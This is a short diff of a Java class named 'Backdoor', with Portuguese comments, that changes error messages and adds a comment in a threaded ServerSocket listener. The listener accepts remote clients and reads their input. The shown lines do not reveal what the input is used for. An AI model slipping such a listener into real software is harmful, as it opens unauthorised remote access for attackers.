@@ -61,6 +61,7 @@ public class Backdoor {
     
     public static void looping(boolean ativo){
         if(ativo){   
+            // abre o socket e fecha recursos com try
             try (ServerSocket serverSocket = new ServerSocket(porta)) {
                 System.out.println(mensagemApresentacao + " na porta "+ porta);
                 while (true) {
@@ -68,7 +69,6 @@ public class Backdoor {
                     Socket cliente = serverSocket.accept();
                     System.out.println("Novo cliente conectado: " + cliente.getInetAddress().getHostAddress());
                     // Cria uma nova thread para lidar com o cliente
-                    
                     new Thread(() -> {
                         String x = "";
                         try (BufferedReader in = new BufferedReader(new InputStreamReader(cliente.getInputStream()))) {
@@ -87,16 +87,14 @@ public class Backdoor {
                             }
                         }
                         catch (Exception e) {
-                            e.printStackTrace();
-                            System.out.println("Erro 404");
+                            System.out.println("Erro ->"+e);
                         } 
                         finally {
                             try {
                                 cliente.close();
                             } 
                             catch (IOException e) {
-                                e.printStackTrace();
-                                System.out.println("Erro 403");
+                                System.out.println("Outro erro ->"+e);
                             }
                         }
                     }).start();
